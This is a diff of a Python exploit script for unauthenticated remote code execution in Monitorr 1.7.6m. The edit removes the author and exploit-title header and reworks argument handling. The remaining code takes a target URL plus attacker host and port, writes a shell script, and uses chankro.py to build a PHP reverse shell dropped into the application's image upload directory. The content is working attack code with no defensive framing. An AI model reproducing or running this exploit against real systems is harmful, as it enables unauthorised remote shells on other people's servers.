@@ -1,22 +1,17 @@
 #!/usr/bin/python
-# -*- coding: UTF-8 -*-
-# MODIFIED VERSION BY VALENT1NE
-# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
-# Date: September 12, 2020
-# Exploit Author: Lyhin's Lab
-# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
-# Software Link: https://github.com/Monitorr/Monitorr
-# Version: 1.7.6m
-# Tested on: Ubuntu 19
 
 import time
 import requests
 import os
 import sys
 
-host = sys.argv[1]
-ip_address = sys.argv[2]
-port = sys.argv[3]
+
+try:
+	host = sys.argv[1]
+	ip_address = sys.argv[2]
+	port = sys.argv[3]
+except:
+	print ("[*] Use: python " + sys.argv[0] + " Target_URL LHOST LPORT")
 
 def generate_shell():
         # Generate shell.sh
@@ -25,12 +20,8 @@ def generate_shell():
         shell_file.close
 
 def exploit():
-        if len (sys.argv) != 4:
-                print ("[*] Use: python " + sys.argv[0] + " Target_URL LHOST LPORT")
-        else:
                 # Generate shell
                 generate_shell()
-                
                 # Generate PHP Reverse Shell using shell.sh and chankro.py
                 cwd = os.getcwd()
                 generate_payload = os.system("python chankro.py --arch 64 --input " + cwd + "/" +  "shell.sh" + " --output rev.php --path /var/www/monitorr/assets/data/usrimg/")
